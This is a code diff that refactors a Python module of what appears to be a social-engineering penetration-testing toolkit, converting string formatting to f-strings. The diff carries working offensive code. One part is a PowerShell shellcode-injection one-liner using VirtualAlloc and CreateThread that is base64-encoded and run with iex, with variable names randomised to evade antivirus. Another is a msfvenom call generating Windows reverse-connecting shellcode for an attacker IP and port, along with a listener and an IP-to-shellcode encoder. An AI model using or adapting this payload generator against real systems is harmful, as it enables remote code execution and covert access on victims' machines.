@@ -1245,15 +1302,14 @@ def custom_template():
                     break
         except KeyboardInterrupt:
             pass
-        filewrite = open("src/templates/%s" % (filename), "w")
-        filewrite.write("# Author: " + author + "\n#\n#\n#\n")
-        filewrite.write('SUBJECT=' + '"' + subject + '"\n\n')
-        filewrite.write('BODY=' + '"' + body + '"\n')
-        print("\n")
-        filewrite.close()
+        with open(f"src/templates/{filename}", "w") as filewrite:
+            filewrite.write(f"# Author: {author}" + "\n#\n#\n#\n")
+            filewrite.write('SUBJECT=' + '"' + subject + '"\n\n')
+            filewrite.write('BODY=' + '"' + body + '"\n')
+            print("\n")
     except Exception as e:
         print_error("ERROR:An error occured:")
-        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
+        print(f"{bcolors.RED}ERROR:{str(e)}{bcolors.ENDC}")
 
 
 # routine for checking length of a payload: variable equals max choice
@@ -1362,15 +1418,19 @@ def is_valid_ipv6(ip):
 
 # kill certain processes
 def kill_proc(port, flag):
-    proc = subprocess.Popen("netstat -antp | grep '%s'" %
-                            (port), shell=True, stdout=subprocess.PIPE)
+    proc = subprocess.Popen(
+        f"netstat -antp | grep '{port}'", shell=True, stdout=subprocess.PIPE
+    )
     stdout_value = proc.communicate()[0]
-    a = re.search("\d+/%s" % (flag), stdout_value)
-    if a:
+    if a := re.search("\d+/%s" % (flag), stdout_value):
         b = a.group()
-        b = b.replace("/%s" % (flag), "")
-        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE,
-                         stderr=subprocess.PIPE, shell=True).wait()
+        b = b.replace(f"/{flag}", "")
+        subprocess.Popen(
+            f"kill -9 {b}",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+        ).wait()
 
 
 # check the config file and return value
@@ -1408,8 +1468,8 @@ def copyfolder(sourcePath, destPath):
         for f in files:
 
             # compute current (old) & new file locations
-            oldLoc = root + '/' + f
-            newLoc = dest + '/' + f
+            oldLoc = f'{root}/{f}'
+            newLoc = f'{dest}/{f}'
 
             if not os.path.isfile(newLoc):
                 try:
@@ -1422,17 +1482,14 @@ def copyfolder(sourcePath, destPath):
 def check_options(option):
         # open the directory
     trigger = 0
-    if os.path.isfile(userconfigpath + "set.options"):
-        fileopen = open(userconfigpath + "set.options", "r").readlines()
+    if os.path.isfile(f"{userconfigpath}set.options"):
+        fileopen = open(f"{userconfigpath}set.options", "r").readlines()
         for line in fileopen:
-            match = re.search(option, line)
-            if match:
+            if match := re.search(option, line):
                 line = line.rstrip()
                 line = line.replace('"', "")
                 line = line.split("=")
                 return line[1]
-                trigger = 1
-
     if trigger == 0:
         return trigger
 
@@ -1441,23 +1498,18 @@ def check_options(option):
 
 def update_options(option):
         # if the file isn't there write a blank file
-    if not os.path.isfile(userconfigpath + "set.options"):
-        filewrite = open(userconfigpath + "set.options", "w")
-        filewrite.write("")
-        filewrite.close()
-
+    if not os.path.isfile(f"{userconfigpath}set.options"):
+        with open(f"{userconfigpath}set.options", "w") as filewrite:
+            filewrite.write("")
     # remove old options
-    fileopen = open(userconfigpath + "set.options", "r")
+    fileopen = open(f"{userconfigpath}set.options", "r")
     old_options = ""
     for line in fileopen:
-        match = re.search(option, line)
-        if match:
+        if match := re.search(option, line):
             line = ""
         old_options = old_options + line
-    # append to file
-    filewrite = open(userconfigpath + "set.options", "w")
-    filewrite.write(old_options + "\n" + option + "\n")
-    filewrite.close()
+    with open(f"{userconfigpath}set.options", "w") as filewrite:
+        filewrite.write(old_options + "\n" + option + "\n")
 
 # python socket listener
 
@@ -1469,7 +1521,7 @@ def socket_listener(port):
     # set is so that when we cancel out we can reuse port
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((host, port))
-    print("Listening on 0.0.0.0:%s" % str(port))
+    print(f"Listening on 0.0.0.0:{port}")
     # listen for only 1000 connection
     s.listen(1000)
     conn, addr = s.accept()
@@ -1496,7 +1548,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     try:
 
         # if not "reverse_http" in payload or not "reverse_https" in payload:
-        if not "http" in payload:
+        if "http" not in payload:
             shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
@@ -1519,21 +1571,21 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
         shellcode = newdata[:-1]
 
     except Exception as e:
-        print_error("Something went wrong, printing error: " + str(e))
+        print_error(f"Something went wrong, printing error: {str(e)}")
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = "$" + generate_random_string(2, 2) # $1 
-    var2 = "$" + generate_random_string(2, 2) # $c
-    var3 = "$" + generate_random_string(2, 2) # $2
-    var4 = "$" + generate_random_string(2, 2) # $3
-    var5 = "$" + generate_random_string(2, 2) # $x
-    var6 = "$" + generate_random_string(2, 2) # $t
-    var7 = "$" + generate_random_string(2, 2) # $h
-    var8 = "$" + generate_random_string(2, 2) # $z
-    var9 = "$" + generate_random_string(2, 2) # $g
-    var10 = "$" + generate_random_string(2, 2) # $i
-    var11 = "$" + generate_random_string(2, 2) # $w
+    var1 = f"${generate_random_string(2, 2)}"
+    var2 = f"${generate_random_string(2, 2)}"
+    var3 = f"${generate_random_string(2, 2)}"
+    var4 = f"${generate_random_string(2, 2)}"
+    var5 = f"${generate_random_string(2, 2)}"
+    var6 = f"${generate_random_string(2, 2)}"
+    var7 = f"${generate_random_string(2, 2)}"
+    var8 = f"${generate_random_string(2, 2)}"
+    var9 = f"${generate_random_string(2, 2)}"
+    var10 = f"${generate_random_string(2, 2)}"
+    var11 = f"${generate_random_string(2, 2)}"
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
@@ -1552,7 +1604,11 @@ def generate_shellcode(payload, ipaddr, port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen(
+        f"{msf_path}msfvenom -p {payload} LHOST={ipaddr} LPORT={port} StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c",
+        stdout=subprocess.PIPE,
+        shell=True,
+    )
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
@@ -1598,16 +1654,16 @@ def shellcode_replace(ipaddr, port, shellcode):
     first = ipaddr[0]
     # split these up to make sure its in the right format
     if len(first) == 1:
-        first = "0" + first
+        first = f"0{first}"
     second = ipaddr[1]
     if len(second) == 1:
-        second = "0" + second
+        second = f"0{second}"
     third = ipaddr[2]
     if len(third) == 1:
-        third = "0" + third
+        third = f"0{third}"
     fourth = ipaddr[3]
     if len(fourth) == 1:
-        fourth = "0" + fourth
+        fourth = f"0{fourth}"
 
     # put the ipaddress into the right format
     ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first, second, third, fourth)
